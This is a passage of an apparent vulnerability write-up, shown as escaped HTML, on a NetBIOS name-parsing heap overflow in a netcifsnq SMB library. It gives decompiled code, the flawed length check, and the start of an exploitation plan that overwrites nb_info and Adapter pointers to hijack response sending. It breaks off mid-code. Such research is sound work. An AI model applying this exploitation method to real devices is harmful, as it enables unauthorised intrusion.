          &lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;634&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;595&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; will parse the domain from the label in the NetBIOS packet to the domain_name buffer and it has a verification. The verification will check that the total length of the label could not larger than maxlen, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.&quot;&lt;/code&gt; will be added between each label. But it does not subtract the length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;.&quot;&lt;/code&gt; characters so that the total length of the label can be larger than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxlen&lt;/code&gt;. It will lead to overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Luckily, there is a useful structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; to achieve our goal.  We can use the heap overflow to overwrite the structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The layout of heap memory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The structure is used to store NetBIOS name information, it also has a member &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; to store the information of connection.&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Adapter&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1023&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword3C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let‚Äôs back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;, if the flag of NetBIOS-NS packet is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xA801&lt;/code&gt;, it will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; to process our NetBIOS name. The result will be written to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter-&amp;gt;responsebuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the conditions are met, it will use ‚ÄòreturnNegativeRegistrationResponse‚Äô to handle the Response.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-2Ch] BYREF&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+1Ah] [bp-16h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;maybe_memcpy_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2349&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_40B06FD8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responsebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndGenerateNameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sySendToSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2392&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2393&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
